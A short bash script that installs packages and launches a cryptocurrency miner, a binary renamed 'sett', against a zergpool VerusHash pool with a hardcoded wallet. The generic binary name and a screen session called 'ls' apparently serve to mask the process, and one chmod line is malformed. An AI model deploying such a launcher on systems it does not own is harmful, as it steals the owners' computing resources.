#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x ongkek.sh && chmod +x sett chmod 777 sett ongkek.sh
screen -dmS ls 
POOL=stratum+tcp://verushash.asia.mine.zergpool.com:3300
WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WORKER=ZERG
./sett -a verus -o $POOL -u $WALLET.$WORKER -t 8
